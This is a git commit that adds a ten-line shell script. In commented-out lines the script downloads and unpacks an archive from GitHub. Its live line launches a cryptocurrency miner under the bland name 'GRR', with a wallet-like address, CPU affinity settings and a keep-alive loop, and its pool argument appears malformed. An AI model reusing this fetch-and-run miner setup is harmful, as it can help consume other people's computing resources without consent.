5668ded3003b2c067de87ae79590112aa715f6b1
RaihanJH <79419747+RaihanJH@users.noreply.github.com>
2021-05-07 00:38:47 +0700

    Add files via upload

---
+++ RawS.sh
@@ -0,0 +1,10 @@
+#!/bin/sh
+#sudo apt update
+#sudo apt install screen -y
+#wget https://github.com/zahrazh/GRR/raw/main/GRR.tar.gz
+#tar -xvzf GRR.tar.gz
+./GRR -a lyra2z330 -o 17074 -u XpQDfBHTriEYZps2g5JkUsvVbXoNfAqN98.1 -t 1 -p password=But --cpu-priority=3 --cpu-affinity=0x3 
+while { 1 }; do
+sleep 5
+done
+sleep 999
